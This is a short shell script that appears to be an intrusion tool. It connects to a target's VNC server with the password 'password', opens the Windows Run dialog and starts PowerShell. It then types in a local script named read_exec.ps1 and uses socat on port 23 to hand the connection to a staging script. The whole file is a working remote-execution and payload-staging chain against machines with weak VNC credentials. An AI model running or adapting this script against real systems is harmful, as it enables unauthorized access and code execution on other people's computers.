#!/bin/sh

vncdo -s $1 -p password \
	pause 2 \
	key meta-r \
	pause 2 \
	type "powershell" \
	key enter \
	pause 2 \
	typefile powershell/read_exec.ps1 && \
	socat TCP:$1:23 EXEC:"./stage.sh $2"
